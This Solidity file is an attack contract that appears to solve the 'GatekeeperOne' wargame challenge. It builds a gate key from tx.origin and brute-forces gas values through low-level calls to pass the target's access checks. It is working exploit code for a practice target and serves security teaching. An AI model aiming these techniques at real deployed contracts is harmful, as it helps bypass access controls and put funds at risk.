// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperOneInterface {
    function entrant() external returns (address);

    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperOne {
    GatekeeperOneInterface gatekeeperOne;
    address target;
    address public entrant;

    event log(bool);
    event logaddr(address);

    constructor(address _addr) public {
        target = _addr;
    }

    function exploit() public {
        bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2**32);
        bool result;
        for (uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(target).call.gas(
                i + 150 + 8191 * 3
            )(abi.encodeWithSignature("enter(bytes8)", key));
            if (result) {
                break;
            }
        }
    }

    function getentrant() public {
        gatekeeperOne = GatekeeperOneInterface(target);
        entrant = gatekeeperOne.entrant();
        emit logaddr(entrant);
    }
}
